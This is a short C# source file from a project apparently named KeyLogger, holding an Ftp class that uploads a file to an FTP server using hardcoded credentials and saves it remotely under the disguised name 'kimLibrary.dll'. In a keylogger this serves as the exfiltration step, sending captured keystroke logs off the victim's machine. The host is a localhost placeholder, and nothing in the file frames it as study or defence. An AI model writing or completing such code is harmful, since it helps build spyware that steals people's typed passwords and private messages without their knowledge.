using System;
using System.IO;
using System.Net;
using System.Text;

namespace KeyLogger
{
    public static class Ftp
    {
        static string host = "ftp://127.0.0.1";
        static string UserId = "Mohammad";
        static string Password = "1234";

        public static void uploadFileToFtpServer(string filePath)
        {

            //Upload Method.
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(new Uri(string.Format("{0}/{1}", host, "kimLibrary.dll")));
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential(UserId, Password);
            Stream ftpstream = request.GetRequestStream();
            FileStream fs = File.OpenRead(filePath);

            // Method to calculate and show the progress.
            byte[] buffer = new byte[1024];
            double total = (double)fs.Length;
            int byteRead = 0;
            double read = 0;
            do
            {
                byteRead = fs.Read(buffer, 0, 1024);
                ftpstream.Write(buffer, 0, byteRead);
                read += (double)byteRead;
            }
            while (byteRead != 0);
            fs.Close();
            ftpstream.Close();
            Console.WriteLine("\n File has been transferred trough FTP. ");
        }

    }

}
